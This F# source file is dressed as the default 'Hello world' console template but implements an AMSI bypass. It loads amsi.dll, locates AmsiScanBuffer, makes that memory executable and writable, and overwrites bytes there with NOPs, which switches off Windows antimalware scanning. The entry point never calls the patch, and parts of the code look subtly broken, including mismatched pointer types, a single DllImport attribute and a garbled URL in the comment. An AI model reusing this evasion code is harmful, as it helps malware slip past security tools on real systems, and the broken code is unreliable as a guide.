// Learn more about F# at h:wattp://docs.microsoft.com/dotnet/fsharp

open System
open System.Runtime.InteropServices

// Define a function to construct a message to print
module K32 =
    [<DllImport("kernel32")>]
    extern IntPtr LoadLibrary(string name);
    extern IntPtr GetProcAddress(IntPtr hModule,string procName);
    extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSizw,uint flNewProtect,uint lpflOldProtect);
    extern void MoveMemory(IntPtr dest,IntPtr src, int size);

let LoadA =
    let out = K32.LoadLibrary("amsi.dll")
    if IntPtr.Equals(out,IntPtr.Zero) then
        printfn "Could not open amsi.dll"
    out

let GetP dl: IntPtr =
    let bptr = K32.GetProcAddress(dl,"AmsiScanBuffer")
    if IntPtr.Equals(bptr,IntPtr.Zero) then
        printfn "Could not open AmsiScanBuffer"
    bptr

let Patch P: IntPtr =
    let zr: uint = uint(0)
    let size: UIntPtr = UIntPtr(uint64(4))
    let len: IntPtr = IntPtr(3)
    let Patch: Byte[] =  Array.create 3 (0x90)
    let Vp = K32.VirtualProtect(P,size,uint(0x40),zr)
    K32.MoveMemory(IntPtr(P+IntPtr(uint64(0x001b))),IntPtr(&Patch),len)
    0

[<EntryPoint>]
let main argv =
    printfn "Hello world"
    0 // return an integer exit code
